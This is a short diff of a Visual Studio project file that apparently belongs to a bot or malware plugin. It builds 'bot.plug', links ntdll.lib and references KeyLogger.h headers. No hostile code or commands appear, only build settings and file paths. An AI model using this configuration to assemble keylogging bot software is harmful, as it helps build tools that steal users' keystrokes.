@@ -128,6 +128,7 @@
 				EnableFunctionLevelLinking="true"
 				RuntimeTypeInfo="false"
 				UsePrecompiledHeader="0"
+				AssemblerOutput="2"
 				WarningLevel="3"
 				DebugInformationFormat="0"
 				OmitDefaultLibName="true"
@@ -143,6 +144,7 @@
 			/>
 			<Tool
 				Name="VCLinkerTool"
+				AdditionalDependencies="..\..\source\lib\ntdll.lib"
 				OutputFile="$(OutDir)\bot.plug"
 				LinkIncremental="1"
 				GenerateManifest="false"
@@ -982,11 +984,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\KeyLogger.h"
+				RelativePath="..\..\Source\Misc\KeyLogger.h"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\KeyLogger.h"
+				RelativePath="..\..\source\Common\KeyLogger.h"
 				>
 			</File>
 			<File
